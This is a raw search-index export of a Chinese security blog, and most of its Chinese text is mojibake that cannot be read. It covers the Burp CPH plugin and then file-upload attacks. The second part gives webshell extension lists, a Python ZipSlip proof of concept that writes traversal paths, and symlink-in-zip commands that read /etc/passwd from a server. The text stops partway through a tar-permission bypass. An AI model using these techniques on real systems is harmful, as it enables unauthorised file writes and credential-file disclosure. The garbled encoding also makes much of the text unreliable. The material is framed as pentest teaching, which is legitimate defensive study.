æœ€ç®€å•çš„æŸ¥æ‰¾æ›¿æ¢å°±æ˜¯æ–‡æœ¬åŒ¹é…æ¨¡å¼ï¼Œä¾‹å¦‚ï¼š hello xiaoming --\u003e hello xiaohong å³ äº¤äº’å¼æ¡ˆä¾‹1ï¼š I do not speak like Yoda! I do not speak like Mr. Mackey, m'kay? æ­£åˆ™åŒ¹é… åˆ©ç”¨æ­£åˆ™è¿›è¡ŒåŒ¹é…ï¼Œæ”¯æŒæ­£åˆ™åˆ†ç»„è¯­æ³•ã€‚ åˆ©ç”¨æ­£åˆ™åˆ†ç»„ï¼Œè°ƒæ•´è¯­å¥ï¼Œå¦‚ï¼š # äº¤äº’å¼æ¡ˆä¾‹2ï¼Œæ³¨æ„æ­£åˆ™çš„å†™æ³• I do not speak like Yoda Speak like Yoda, I do not! å®šä½åŒ¹é… è¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„è®¾è®¡ï¼Œä¸Pythonåˆ‡ç‰‡ç±»ä¼¼ã€‚ å¦‚æœæŸä¸ªç‰¹å®šåŒ¹é…åœ¨ç»™å®šçš„ HTTP æ¶ˆæ¯ä¸­å‡ºç°å¤šæ¬¡ï¼Œåˆ™å¯ä»¥å®šä½ç‰¹å®šåŒ¹é…ï¼Œä½†å¹¶éæ‰€æœ‰åŒ¹é…éƒ½åº”è¯¥ä¿®æ”¹ã€‚ è´Ÿå€¼æœ‰æ•ˆã€‚æ— æ•ˆå€¼ï¼ˆä¾‹å¦‚å­—æ¯ï¼‰å°†è¢«å¿½ç•¥ã€‚æ”¯æŒ0:3,-1è¿™ç§å†™æ³•ï¼Œè¡¨ç¤ºå¯¹å‰3ä¸ªå’Œæœ€å1ä¸ªåŒ¹é…é¡¹è¿›è¡Œæ›¿æ¢ã€‚ é€‰æ‹©ï¼šTarget a subset of the matches # äº¤äº’å¼æ¡ˆä¾‹4ï¼Œæ³¨æ„å®šä½åŒ¹é…çš„å†™æ³• # åŒ¹é… [ ] ç¬¦å·ï¼Œé€‰æ‹©å…¶ä¸­çš„0,4,8 è¿›è¡Œæ›¿æ¢ ## åŸå“åº”ï¼š [0][ ]1st [1][ ]2nd [2][ ]3rd [3][ ]4th [4][ ]5th [5][ ]6th [6][ ]7th [7][ ]8th [8][ ]9th ## é¢„æœŸå“åº”ï¼š [0][X]1st [1][ ]2nd [2][ ]3rd [3][ ]4th [4][X]5th [5][ ]6th [6][ ]7th [7][ ]8th [8][X]9th ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:3","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"2.æ›¿æ¢åŠ¨æ€å€¼ å‘å‡ºå•ç‹¬çš„è¯·æ±‚ä»¥ä½¿ç”¨å…¶å“åº”ä¸­çš„åŠ¨æ€å€¼ å¦‚æœéœ€è¦å‘å‡ºå•ç‹¬çš„è¯·æ±‚ä»¥æå–è¦ä½¿ç”¨çš„æ–°å€¼ï¼ˆä¾‹å¦‚ï¼ŒCSRFä»¤ç‰Œï¼‰ï¼Œä¸”å¿…è¦çš„è¯·æ±‚å·²ç»å­˜åœ¨äºBurp Suiteçš„å…¶ä»–åœ°æ–¹ï¼ˆä¾‹å¦‚ï¼ŒTargetï¼ŒProxyï¼ŒRepeaterç­‰ï¼‰ï¼Œåªéœ€å³é”®å•å‡»æ‰€è¿°è¯·æ±‚å¹¶é€‰æ‹©å‘é€åˆ°CPHã€‚ å¦åˆ™ï¼Œåˆ›å»ºä¸€ä¸ª CPH é€‰é¡¹å¡å¹¶ï¼š å‹¾é€‰ï¼šæˆ‘éœ€è¦çš„å€¼æ˜¯åŠ¨æ€ï¼ˆThe value I need is dynamicï¼‰ åœ¨ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©ï¼šå‘å‡ºå•ä¸ªè¯·æ±‚è¿”å›çš„å€¼ï¼ˆvalues returned by issuing a single requestï¼‰ ç„¶åï¼Œå°†è¯·æ±‚å¤åˆ¶/ç²˜è´´ï¼ˆæˆ–æ‰‹åŠ¨è¾“å…¥ï¼‰åˆ°å·¦ä¾§çª—æ ¼ä¸­ã€‚ è¿™å— UI æœ‰ç‚¹å°é—®é¢˜ï¼Œå¦‚æœåªçœ‹åˆ°å“åº”åŒ…æ¡†çš„è¯ï¼Œå¯ä»¥ æ‰¾åˆ°ä¸‰ä¸ªç‚¹ ä½ç½®çœ‹èƒ½ä¸èƒ½è°ƒæ•´å¤§å°ã€‚ æœ€åï¼Œé…ç½®ä¸€ä¸ªé€‚å½“çš„è¡¨è¾¾å¼ä»¥ä¾¿ä»ç›¸å…³å“åº”ä¸­æå–å€¼ã€‚ # äº¤äº’å¼æ¡ˆä¾‹4ï¼Œæ³¨æ„æ­£åˆ™çš„å†™æ³• # ä»å“åº”åŒ…ä¸­åŒ¹é…è¿”å›å€¼ï¼š(?P\u003cnumber\u003e\\d{1,5})$ï¼Œå¹¶åœ¨è¯·æ±‚åŒ…ä¸­è¿›è¡Œæ›¿æ¢ /1/\\g\u003cnumber\u003e ## åŸå“åº”ï¼š Try again! New number: \u003crandom number\u003e ## é¢„æœŸå“åº”ï¼š \u003cnumber\u003e was correct! New number: \u003crandom number\u003e ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:4","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"3. å® VS CPH åˆ©ç”¨CPH å®ç° Burp å®çš„åŠŸèƒ½ã€‚ æ¡ˆä¾‹åœºæ™¯ï¼š æ ¡éªŒéšæœºCookieï¼Œè®¿é—®è¯·æ±‚ï¼š è®¿é—® /numberï¼Œè·å–æ ¡éªŒç  valueï¼› è®¿é—®/cookieï¼Œè®¾ç½®cookie é…ç½® Cookie: number=\u003cvalue\u003eï¼Œä½¿ç”¨POSTè¯·æ±‚ï¼Œè®¿é—® /numberï¼Œä¿®æ”¹numberå€¼ã€‚ POST /number HTTP/1.1 Host: 127.0.0.1:9001 Content-Length: 10 Cookie: number=\u003cvalue\u003e number=123 åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼ŒBurpå® ä¸ CPH éƒ½å¯ä»¥å®ç°ã€‚ Burpçš„é…ç½®æ–‡ä»¶ï¼š Burp å®æ–‡ä»¶å’Œ Burp Session rulesæ–‡ä»¶ CPH é…ç½®æ–‡ä»¶ï¼š CPH config file ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:5","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"4. Burp å®ç»“åˆ CPH æ¡ˆä¾‹åœºæ™¯ï¼š æŒ‰ç…§ä»¥ä¸‹æµç¨‹è¿›è¡Œæ ¡éªŒï¼š è®¿é—® /numberï¼Œè·å–ç¬¬ä¸€ä¸ªæ ¡éªŒç  value1ï¼› è®¿é—®/1?number=\u003cvalue1\u003eï¼Œè·å–ç¬¬äºŒä¸ªæ ¡éªŒç  value2ï¼› è®¿é—®/2?number=\u003cvalue2\u003eï¼Œè·å–ç¬¬ä¸‰ä¸ªæ ¡éªŒç  value3ï¼› è®¿é—®/3?number=\u003cvalue3\u003eï¼Œè·å–ç¬¬å››ä¸ªæ ¡éªŒç  value4ï¼› è®¿é—®/check/\u003cvalue4\u003e é€šè¿‡æœ€ç»ˆçš„æ ¡éªŒã€‚ å…¶ä¸­1-4æ­¥éƒ½å¯ä»¥é€šè¿‡Burp å®è§£å†³ï¼Œæœ€åä¸€æ­¥å®æ— æ³•å®Œæˆï¼Œéœ€è¦ä½¿ç”¨CPHè¿›è¡Œæ›¿æ¢ã€‚ Burpçš„é…ç½®æ–‡ä»¶ï¼šæ­¤ Burp å®æ–‡ä»¶å’Œæ­¤ Burp è§„åˆ™æ–‡ä»¶ CPH é…ç½®æ–‡ä»¶ï¼šCPH config file ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:6","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"5. åˆ©ç”¨ç¼“å­˜å“åº” æ¡ˆä¾‹åœºæ™¯ï¼š æŒ‰ç…§ä»¥ä¸‹æµç¨‹è¿›è¡Œæ ¡éªŒï¼š è®¿é—® /numberï¼Œè·å–ç¬¬ä¸€ä¸ªæ ¡éªŒç  value1ï¼› è®¿é—®/1/\u003cvalue1\u003eï¼Œé€šè¿‡æ ¡éªŒåè·å–æ–°æ ¡éªŒç  value2ï¼› è®¿é—®/2/\u003cvalue2\u003eï¼Œé€šè¿‡æ ¡éªŒåè·å–æ–°æ ¡éªŒç  value3ï¼› è®¿é—®/3/\u003cvalue3\u003eï¼Œé€šè¿‡æ ¡éªŒåè·å–æ–°æ ¡éªŒç  value4ã€‚ è®¿é—®/check/\u003cvalue4\u003e é€šè¿‡æœ€ç»ˆçš„æ ¡éªŒã€‚ ä¸Šè¿°åœºæ™¯ä¸‹ï¼ŒBurpå®æ— æ³•å®ç°æ ¡éªŒç çš„æ›¿æ¢ï¼Œå¯ä»¥åˆ©ç”¨CPHçš„ç¼“å­˜å“åº”åŠŸèƒ½è¿›è¡Œå®ç°ã€‚ å‹¾é€‰ï¼š æˆ‘éœ€è¦çš„å€¼æ˜¯åŠ¨æ€ï¼ˆThe value I need is dynamicï¼‰ åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­é€‰æ‹©ï¼šä¸Šä¸€ä¸ª CPH é€‰é¡¹å¡çš„ç¼“å­˜å“åº”ä¸­çš„å€¼ ï¼ˆvalues in the cached response of a previous CPH tabï¼‰ Burpçš„é…ç½®æ–‡ä»¶ï¼šæ­¤ Burp å®æ–‡ä»¶å’Œæ­¤ Burp è§„åˆ™æ–‡ä»¶ CPH é…ç½®æ–‡ä»¶ï¼šCPH config file ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:7","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"6. CPH ä»£æ›¿ å® https://github.com/elespike/burp-cph/wiki/09.-CPH-as-an-alternative-to-macros æ¡ˆä¾‹åœºæ™¯ï¼š æŒ‰ç…§ä»¥ä¸‹æµç¨‹è¿›è¡Œæ ¡éªŒï¼š è®¿é—® /numberï¼Œè·å–ç¬¬ä¸€ä¸ªæ ¡éªŒç  value1ï¼› è®¿é—®/1/\u003cvalue1\u003eï¼Œé€šè¿‡æ ¡éªŒåè·å–æ–°æ ¡éªŒç  value2ï¼› è®¿é—®/2/\u003cvalue2\u003eï¼Œé€šè¿‡æ ¡éªŒåè·å–æ–°æ ¡éªŒç  value3ï¼› è®¿é—®/3/\u003cvalue3\u003eï¼Œé€šè¿‡æ ¡éªŒåè·å–æ–°æ ¡éªŒç  value4ã€‚ è®¿é—®/check/\u003cvalue4\u003e é€šè¿‡æœ€ç»ˆçš„æ ¡éªŒã€‚ è¿™é‡Œçš„æ¡ˆä¾‹åœºæ™¯ä¸5ä¸€æ ·ï¼Œä½†æ˜¯è¿™æ¬¡ä¸ä½¿ç”¨å®å’Œç¼“å­˜å“åº”åŠŸèƒ½ï¼Œçº¯ç²¹ä¾é CPHè¿›è¡Œå®ç°ã€‚ CPH é…ç½®æ–‡ä»¶ï¼šCPH config file CPH è¿›è¡ŒèŒƒå›´åŒ¹é…ï¼Œä¼šè‡ªåŠ¨ç¯¡æ”¹æ ‡ç­¾ä¸­å®šä¹‰èŒƒå›´å†…çš„æ•°æ®ï¼Œå› æ­¤å®ƒçš„è°ƒç”¨é€»è¾‘æ˜¯é€†åºçš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ç›‘æµ‹åˆ°ç”¨æˆ·è®¿é—®/check/\u003cvalue\u003e ï¼Œå…¶ä¸­\u003cvalue\u003eå€¼æ˜¯åŠ¨æ€çš„æ¥è‡ª/3/\u003cvalue\u003eï¼Œäºæ˜¯å»è¯·æ±‚/3/\u003cvalue3\u003e ç›‘æµ‹åˆ°è®¿é—®/3/\u003cvalue\u003eï¼Œå…¶ä¸­\u003cvalue\u003eå€¼æ˜¯åŠ¨æ€çš„æ¥è‡ª/2/\u003cvalue\u003eï¼Œäºæ˜¯å»è¯·æ±‚/2/\u003cvalue3\u003e ç›‘æµ‹åˆ°è®¿é—®/2/\u003cvalue\u003eï¼Œå…¶ä¸­\u003cvalue\u003eå€¼æ˜¯åŠ¨æ€çš„æ¥è‡ª/1/\u003cvalue\u003eï¼Œäºæ˜¯å»è¯·æ±‚/1/\u003cvalue3\u003e ç›‘æµ‹åˆ°è®¿é—®/1/\u003cvalue\u003eï¼Œå…¶ä¸­\u003cvalue\u003eå€¼æ˜¯åŠ¨æ€çš„æ¥è‡ª/numberï¼Œäºæ˜¯å»è¯·æ±‚/number è¯·æ±‚/number è·å–åŠ¨æ€å€¼ï¼Œå¹¶æ›¿æ¢ç»™/1/\u003cvalue\u003eï¼Œåé¢ä¹Ÿæ˜¯å¦‚æ­¤ä¾æ¬¡è¿›è¡Œã€‚ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:8","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"6. æ­£åˆ™è¡¨è¾¾å¼ RegEx æ ‡å¿— åœ¨æ¨¡å¼çš„å¼€å¤´ï¼Œæ‚¨å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼æ ‡å¿—ï¼š (?Limuxs) Lï¼šå–å†³äºè¯­è¨€ç¯å¢ƒï¼ˆlocale dependentï¼‰ i: å¿½ç•¥å¤§å°å†™ mï¼šå¤šè¡Œ u: unicode xï¼šè¯¦ç»† s:.åŒ¹é…æ‰€æœ‰å†…å®¹ï¼ˆé€šå¸¸ä¸åŒ¹é…\\nï¼‰ å‰ç»å’Œåç»æ–­è¨€ CPH æ”¯æŒæ­£å‘/è´Ÿå‘ å‰ç»å’Œåç»æ–­è¨€ æ­£å‘å‰ç»æ–­è¨€ï¼š\\d{5}(?=00000)ï¼Œæ”¹ä¸ºè´Ÿå‘å‰ç»æ–­è¨€ ï¼š\\d{5}(?!00000) æ­£å‘åç»æ–­è¨€ï¼š(?\u003c=00000)\\d{5}ï¼Œæ”¹ä¸ºè´Ÿå‘åç»æ–­è¨€ ï¼š ï¼Œ(?\u003c!00000)\\d{5} ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:9","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"å¿«æ·é”® è™½ç„¶æ„Ÿè§‰æ²¡å•¥å¿…è¦ï¼Œä½†æ˜¯è¿˜æ˜¯å†™ä¸€ä¸‹ Ctrl+N åˆ›å»ºæ–°æ ‡ç­¾é¡µ Ctrl+Shift+N å…‹éš†å½“å‰æ ‡ç­¾ Ctrl+W å…³é—­å½“å‰æ ‡ç­¾ Ctrl+E å¯ç”¨/ç¦ç”¨å½“å‰é€‰é¡¹å¡ Ctrl+, é€‰æ‹©ä¸Šä¸€ä¸ªæ ‡ç­¾ Ctrl+. é€‰æ‹©ä¸‹ä¸€ä¸ªæ ‡ç­¾ Ctrl+Shift, å‘åç§»åŠ¨æ ‡ç­¾ Ctrl+Shift. å‘å‰ç§»åŠ¨æ ‡ç­¾ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:10","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"JSONæµ‹è¯•ç”¨ä¾‹ ä¸ªäººç¼–å†™çš„ä¸€ä¸ªç®€å•æµ‹è¯• æ¡ˆä¾‹åœºæ™¯ï¼š ä»ä¸Šä¸€ä¸ªå“åº”åŒ…ä¸­æå–æ‰€éœ€çš„JSONæ•°æ®ï¼Œèµ‹å€¼ç»™ç›®æ ‡è¯·æ±‚çš„ç›¸åº”JSONå‚æ•°ã€‚ æµ‹è¯•ä»£ç ï¼š from flask import Flask, request, jsonify import requests import random from flask_caching import Cache app = Flask(__name__) cache = Cache(app, config={'CACHE_TYPE': 'simple'}) @app.route('/api1', methods=['GET']) def api1(): result = random.randint(1, 100) cache.set('result', result) return jsonify({\"éªŒè¯ç \": result,\"yzm\": result, \"message\": \"success\"}) @app.route('/api/check', methods=['POST']) def api4(): data = request.get_json() if data is None or 'index' not in data: return jsonify({\"error\": \"Invalid JSON data or missing 'index' field\"}) index = int(data['index']) result_from_api1 = int(cache.get('result')) if index == result_from_api1: return jsonify({\"message\": \"check successfully!\"}) else: return jsonify({\"message\": \"invaild value!\"}) if __name__ == '__main__': app.run(debug=True) é…ç½®ï¼š Parameter handling: # 1) Find matches to this expression: {\"index\": 123} # 3) Replace each target with this expression: {\"index\": \\g\u003cnumber\u003e} # 4) In the expression above, refer to the named RegEx groups you'll define below in order to insert: \"\\\\u9a8c\\\\u8bc1\\\\u7801\"\\: (?P\u003cnumber\u003e\\d{1,5})\\n\\}\\n ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:4:0","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"å‚è€ƒ é¡¹ç›®åœ°å€ï¼šhttps://github.com/elespike/burp-cph/ wikiåœ°å€ï¼šhttps://github.com/elespike/burp-cph/wiki Burp Suiteã®æ‹¡å¼µæ©Ÿèƒ½ Custom-Request-Handlerã‚’ä½œæˆã—ã¾ã—ãŸ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:5:0","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Pentest"],"content":"ç®€è¿°ä¸€äº›æ–‡ä»¶ä¸Šä¼ åœºæ™¯ä¸‹çš„æ”»å‡»é¢ï¼Œå¹¶æä¾›ä¸€äº›æ¼æ´æ¡ˆä¾‹ã€‚","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.1. å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç»æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹æœ‰å“ªäº›æ”»å‡»é¢ã€‚ æ•´ç†çš„æœ‰ç‚¹ç²—ç³™ï¼Œå°†å°±çœ‹å§ã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:1:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.2. å…è®¸ç›´æ¥ä¸Šä¼ shell åªè¦æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ä¸Šä¼ shellç›´æ¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ï¼Œè¿™æ˜¯æœ€ç®€å•ä¹Ÿæ˜¯æœ€ç›´æ¥çš„åˆ©ç”¨ã€‚ ä¸Šä¼ shellåŒ…æ‹¬Webshellã€è„šæœ¬æ–‡ä»¶ã€ä»£ç æ–‡ä»¶ç­‰ Java/JSP åç¼€ jsp jsw jsv jspa jspf jspx jhtml PHPåç¼€ï¼š php php2 php3 php4 php5 php6 php7 pht inc phps phar pgif phtm phtml shtml html htm ASP.NET åç¼€ asp asa svc rem axd asax ascx asmx cer aspx ashx aspq soap xamlx cshtm vbhtm cshtml vbhtml Apache SSIä¸Šä¼  stm shtm shtml å…¶ä»–ï¼š pl pm sh cfm cgi lib ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:2:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.3. å…è®¸ä¸Šä¼ å‹ç¼©åŒ… ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"ZipSlip/Traversal å¦‚æœå¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ï¼Œå¹¶ä¸”æœåŠ¡ç«¯ä¼šå¯¹å‹ç¼©åŒ…è§£å‹ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨ZipSlip/Traversalç›®å½•ç©¿è¶Šæ¼æ´ï¼› é€šè¿‡æ„é€ ä¸€ä¸ªå‹ç¼©åŒ…ä¸­å¸¦æœ‰../çš„å‹ç¼©æ–‡ä»¶ï¼Œä¸Šä¼ åäº¤ç»™æœåŠ¡ç«¯åº”ç”¨ç¨‹åºè¿›è¡Œè§£å‹ï¼Œå¦‚æœç¨‹åºè§£å‹æ—¶æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…çš„æ–‡ä»¶åè¿›è¡Œåˆæ³•æ€§æ ¡éªŒï¼Œè€Œæ˜¯ç›´æ¥å°†æ–‡ä»¶åæ‹¼æ¥åœ¨å¾…è§£å‹ç›®å½•åé¢ï¼Œå¯¼è‡´å¯ä»¥å°†æ–‡ä»¶è§£å‹åˆ°æ­£å¸¸è§£å‹ç¼©è·¯å¾„ä¹‹å¤–ï¼Œå¯èƒ½å¯¼è‡´æ¶æ„æ–‡ä»¶çš„å†™å…¥ã€è¦†ç›–æ›¿æ¢å¯æ‰§è¡Œæ–‡ä»¶ç­‰ï¼Œç­‰å¾…ç³»ç»Ÿæˆ–ç”¨æˆ·è°ƒç”¨æ¶æ„æ–‡ä»¶ï¼Œä»è€Œå®ç°ä»£ç æ‰§è¡Œï¼ˆä¹Ÿå¯èƒ½æ˜¯è¦†ç›–é…ç½®æ–‡ä»¶æˆ–å…¶ä»–æ•æ„Ÿæ–‡ä»¶ï¼‰ã€‚ å¯èƒ½çš„å‹ç¼©åŒ…æ ¼å¼åç¼€åŒ…æ‹¬ï¼š tar jar war cpio apk rar 7z æœ¬è´¨ï¼š æ²¡æœ‰å¯¹å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶åè¿›è¡Œåˆæ³•æ€§æ ¡éªŒï¼Œç›´æ¥å°†æ–‡ä»¶åæ‹¼æ¥åˆ°å¾…è§£å‹ç›®å½•ä¸­ï¼Œå¯¼è‡´å­˜åœ¨è·¯å¾„éå†é£é™©ã€‚ ä¸¾ä¾‹ï¼š è‹¥è§£å‹ç›®å½•ä¸º/webapp/web/ï¼Œç»™æ–‡ä»¶å‘½åä¸ºï¼š../../var/www/html/1.phpå¹¶å‹ç¼©ï¼Œé‚£ä¹ˆæ–‡ä»¶è§£å‹åï¼Œé€šè¿‡ç›´æ¥æ‹¼æ¥æ–‡ä»¶åä¸º/webapp/web/../../var/www/html/1.phpï¼Œå› æ­¤æœ€ç»ˆå°±ä¼šå­˜æ”¾åˆ°/var/www/html/1.phpä¸­ï¼Œå¦‚æœèƒ½è®¿é—®å¹¶è§£æï¼Œé‚£ä¹ˆå°±èƒ½æˆåŠŸä»£ç æ‰§è¡Œã€‚ åˆ©ç”¨ï¼š zip-slip-vulnerability é¡¹ç›®åŒ…å«äº†æœ‰å…³æ­¤æ”»å‡»çš„æ‰€æœ‰ä¿¡æ¯ï¼Œä¾‹å¦‚å—å½±å“çš„åº“ã€é¡¹ç›®å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚ æ„é€ ä»£ç ï¼š ä¹Ÿå¯ä»¥ç”¨åˆ«äººå†™å¥½çš„å·¥å…·ï¼šhttps://github.com/ptoomey3/evilarc import zipfile # the name of the zip file to generate zf = zipfile.ZipFile('out.zip', 'w') # the name of the malicious file that will overwrite the origial file (must exist on disk) fname = 'zip_slip.txt' #destination path of the file zf.write(fname, '../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa') ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:1","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"Symlinks attack tar/zip å…è®¸å‹ç¼©åŒ…ä¸­åŒ…å«ç¬¦å·é“¾æ¥ã€‚ç¬¦å·é“¾æ¥æ˜¯ä¸€ç§é“¾æ¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶çš„ç‰¹æ®Šæ–‡ä»¶ã€‚é€šè¿‡ä¸Šä¼ åŒ…å«ç¬¦å·é“¾æ¥çš„ ZIPï¼Œå¹¶åœ¨è§£å‹ ZIP åï¼Œå¯ä»¥é€šè¿‡è®¿é—®ç¬¦å·é“¾æ¥ä»¥è®¿é—®åˆ°åŸæœ¬æ— æ³•è®¿é—®çš„æ–‡ä»¶ã€‚ä¸ºæ­¤ï¼Œéœ€è¦è®©ç¬¦å·é“¾æ¥æŒ‡å‘ Web æ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚â€œ/etc/passwdâ€ã€‚ è¿™äº›ç±»å‹çš„é—®é¢˜é€šå¸¸æ˜¯åœ¨å¼€å‘äººå‘˜å…è®¸ä¸Šä¼  ZIP æ–‡ä»¶æ—¶å‘ç°çš„ã€‚å½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­ä¸Šä¼ æ¶æ„ ZIP æ–‡ä»¶æ—¶ï¼Œå®ƒåªä¼šè·å– ZIP æ–‡ä»¶å¹¶å°†å…¶æå–å‡ºæ¥ï¼Œè€Œä¸ä¼šè¿›è¡Œä»»ä½•è¿›ä¸€æ­¥çš„éªŒè¯ã€‚ ä¾‹å¦‚ï¼š facebook æœ¬åœ°æ–‡ä»¶è¯»å– CVE-2016-9086-è¯»å–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¯¼è‡´ RCE 1. åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥æ–‡ä»¶æŒ‡å‘/etc/passwd ln -s /etc/passwd link 2. å‹ç¼©æ–‡ä»¶ï¼ŒåŒæ—¶ä¿ç•™é“¾æ¥ zip --symlinks test.zip link 3. ä¸Šä¼ test.zipæ–‡ä»¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§£å‹ç¼© 4. é¡µé¢å½“ä¸­ä¼šè¿”å›/etc/passwdçš„å†…å®¹ è¿™é‡Œæ˜¯é€šè¿‡ç»å¯¹è·¯å¾„è¯»å–æ–‡ä»¶ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯ç›¸å¯¹è·¯å¾„ã€‚ å‚è€ƒï¼šhttps://secops.group/anatomy-of-a-file-upload-attack/ åˆ›å»ºäº†/etc/passwd æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†æ–‡ä»¶å‹ç¼©åˆ° ZIP å­˜æ¡£ä¸­ sudo ln -s ../../../../../../../../../../etc/passwd name_of_symlink.txt sudo zip --symlink zip_file.zip name_of_symlink.txt ä¸Šä¼ äº†åŒ…å«Symlinkçš„ZIPæ–‡ä»¶ï¼Œæå–äº† Symlink æ–‡ä»¶ï¼Œé€šè¿‡é¢„è§ˆæ–‡ä»¶è®¿é—®æœåŠ¡å™¨çš„â€œpasswdâ€æ–‡ä»¶çš„å†…å®¹ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:2","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"åˆ©ç”¨taræƒé™ Abusing tar permissions å¦‚æœåº”ç”¨ç¨‹åºæœåŠ¡ç«¯ä½¿ç”¨ tarå‘½ä»¤æå–è§£å‹.taræ–‡ä»¶ã€åˆ é™¤ç¬¦å·é“¾æ¥å¹¶è®¿é—®å­ç›®å½•ï¼Œåˆ™å¯ä»¥å°è¯•åˆ©ç”¨ tar æƒé™æ§åˆ¶ç»•è¿‡ç¬¦å·é“¾æ¥åˆ é™¤è¿‡ç¨‹ã€‚ tarå‘½ä»¤åˆ›å»º.taræ–‡ä»¶å­˜æ¡£æ—¶ä¼šä¿ç•™åˆ†é…ç»™å®ƒçš„ unix æƒé™ã€‚å¦‚æœè®¾ç½®çˆ¶ç›®å½•æ— äººå¯è¯»ï¼ˆ chmod 300ï¼‰ï¼ŒåŒæ—¶å­ç›®å½•å…·æœ‰å®Œæ•´æƒé™ï¼ˆ chmod 700ï¼‰ï¼Œåˆ™å¯ä»¥åœ¨å­ç›®å½•ä¸­åŒ…å«ç¬¦å·é“¾æ¥ï¼Œè¿™äº›ç¬¦å·é“¾æ¥åœ¨ç¬¦å·é“¾æ¥åˆ é™¤è¿‡ç¨‹ä¸­ä¸ä¼šè¢«æ‰¾åˆ°ï¼Œä½†ç”±äºå­ç›®å½•å…·æœ‰è¯»å–æƒé™ï¼Œå› 